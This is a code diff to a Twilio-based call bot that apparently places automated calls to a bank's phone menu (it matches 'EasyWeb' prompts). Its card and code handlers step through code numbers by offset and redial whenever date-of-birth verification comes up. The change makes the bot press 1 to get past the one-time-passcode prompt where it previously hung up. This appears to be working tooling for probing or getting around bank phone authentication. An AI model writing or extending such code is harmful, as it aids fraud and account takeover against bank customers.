@@ -172,7 +172,9 @@ const isOneTimePasscodePrompt = (speech) => {
   const lower = speech.toLowerCase();
   return (
     lower.includes('1 time passcode') ||
+    lower.includes('1. time passcode') ||
     lower.includes('one time passcode') ||
+    lower.includes('receive your 1') ||
     lower.includes('easyweb profile') ||
     lower.includes('easyweb') ||
     lower.includes('confirm your identity') ||
@@ -254,11 +256,33 @@ export const handleListenGreeting = async (req, res) => {
       result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
     }).eq('id', attemptId);
 
-    // 🛑 Check for Immediate Hangup Triggers (DOB / Passcode)
-    if (isDOBPrompt(SpeechResult) || isOneTimePasscodePrompt(SpeechResult)) {
-      await AttemptModel.addLog(attemptId, `🛑 Target IVR requested Date of Birth / Passcode verification. Dropping call immediately and starting new call...`);
-      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'IVR requested DOB or One-Time Passcode' });
+    // 🛑 Check for Date of Birth Hangup Trigger
+    if (isDOBPrompt(SpeechResult)) {
+      await AttemptModel.addLog(attemptId, `🛑 Target IVR requested Date of Birth verification. Dropping call immediately and starting new call...`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'IVR requested DOB' });
       twiml.hangup();
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    // Check if IVR asks for One-Time Passcode option
+    if (isOneTimePasscodePrompt(SpeechResult)) {
+      await AttemptModel.addLog(attemptId, `IVR asked for 1-time passcode option. Transmitting DTMF: 1`);
+      currentTranscript = currentTranscript ? `${currentTranscript}\nUser (DTMF): 1` : `User (DTMF): 1`;
+      await supabase.from('attempts').update({
+        result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
+      }).eq('id', attemptId);
+
+      twiml.play({ digits: 'w1' });
+      const gather = twiml.gather({
+        input: 'speech',
+        speechTimeout: 'auto',
+        timeout: 10,
+        action: `${host}/api/call/listen-greeting/${attemptId}`,
+        method: 'POST'
+      });
+      gather.pause({ length: 2 });
+      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-greeting/${attemptId}`);
       res.type('text/xml');
       return res.send(twiml.toString());
     }
@@ -365,11 +389,33 @@ export const handleListenCard = async (req, res) => {
       result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
     }).eq('id', attemptId);
 
-    // 🛑 Check for Immediate Hangup Triggers (DOB / Passcode)
-    if (isDOBPrompt(SpeechResult) || isOneTimePasscodePrompt(SpeechResult)) {
-      await AttemptModel.addLog(attemptId, `🛑 Target IVR requested Date of Birth / Passcode verification. Dropping call immediately and starting new call...`);
-      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'IVR requested DOB or One-Time Passcode' });
+    // 🛑 Check for Date of Birth Hangup Trigger
+    if (isDOBPrompt(SpeechResult)) {
+      await AttemptModel.addLog(attemptId, `🛑 Target IVR requested Date of Birth verification. Dropping call immediately and starting new call...`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'IVR requested DOB' });
       twiml.hangup();
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    // Check if IVR asks for One-Time Passcode option
+    if (isOneTimePasscodePrompt(SpeechResult)) {
+      await AttemptModel.addLog(attemptId, `IVR asked for 1-time passcode option. Transmitting DTMF: 1`);
+      currentTranscript = currentTranscript ? `${currentTranscript}\nUser (DTMF): 1` : `User (DTMF): 1`;
+      await supabase.from('attempts').update({
+        result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
+      }).eq('id', attemptId);
+
+      twiml.play({ digits: 'w1' });
+      const gather = twiml.gather({
+        input: 'speech',
+        speechTimeout: 'auto',
+        timeout: 12,
+        action: `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`,
+        method: 'POST'
+      });
+      gather.pause({ length: 2 });
+      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`);
       res.type('text/xml');
       return res.send(twiml.toString());
     }
@@ -481,11 +527,33 @@ export const handleListenCode = async (req, res) => {
       result_details: { ...(attempt?.result_details || {}), transcript: updatedTranscript }
     }).eq('id', attemptId);
 
-    // 🛑 Check for Immediate Hangup Triggers (DOB / Passcode)
-    if (isDOBPrompt(SpeechResult) || isOneTimePasscodePrompt(SpeechResult)) {
-      await AttemptModel.addLog(attemptId, `🛑 Target IVR requested Date of Birth / Passcode verification. Hanging up call immediately.`);
-      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'IVR requested DOB or One-Time Passcode' });
+    // 🛑 Check for Date of Birth Hangup Trigger
+    if (isDOBPrompt(SpeechResult)) {
+      await AttemptModel.addLog(attemptId, `🛑 Target IVR requested Date of Birth verification. Hanging up call immediately.`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'IVR requested DOB' });
       twiml.hangup();
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    // Check if IVR asks for One-Time Passcode option
+    if (isOneTimePasscodePrompt(SpeechResult)) {
+      await AttemptModel.addLog(attemptId, `IVR asked for 1-time passcode option. Transmitting DTMF: 1`);
+      updatedTranscript = `${updatedTranscript}\nUser (DTMF): 1`;
+      await supabase.from('attempts').update({
+        result_details: { ...(attempt?.result_details || {}), transcript: updatedTranscript }
+      }).eq('id', attemptId);
+
+      twiml.play({ digits: 'w1' });
+      const gather = twiml.gather({
+        input: 'speech',
+        speechTimeout: 'auto',
+        timeout: 12,
+        action: `${host}/api/call/listen-code/${attemptId}?startCodeNum=${startCodeNum}&codeOffset=${codeOffset}`,
+        method: 'POST'
+      });
+      gather.pause({ length: 2 });
+      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-code/${attemptId}?startCodeNum=${startCodeNum}&codeOffset=${codeOffset}`);
       res.type('text/xml');
       return res.send(twiml.toString());
     }
